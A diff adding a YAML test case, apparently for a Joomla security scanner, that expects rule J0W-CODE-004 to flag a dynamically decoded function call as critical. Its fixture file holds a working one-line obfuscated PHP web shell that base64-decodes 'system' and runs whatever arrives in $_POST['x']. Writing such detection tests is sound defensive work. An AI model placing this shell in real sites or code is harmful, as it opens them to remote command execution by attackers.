@@ -1,0 +1,16 @@
+# Dataflow: nombre de función decodificado e invocado → J0W-CODE-004 critical.
+case: code-dynamic-call
+base:
+  cms: joomla
+  version: "1.1.0"
+expect:
+  exit_code: 1
+  findings:
+    - rule_id: J0W-CODE-004
+      subject: components/com_labext/src/dyn.php
+      min_severity: critical
+mutations:
+  - op: add_extension
+  - op: add_file
+    path: components/com_labext/src/dyn.php
+    content: "<?php $g = base64_decode('c3lzdGVt'); $g($_POST['x']); "
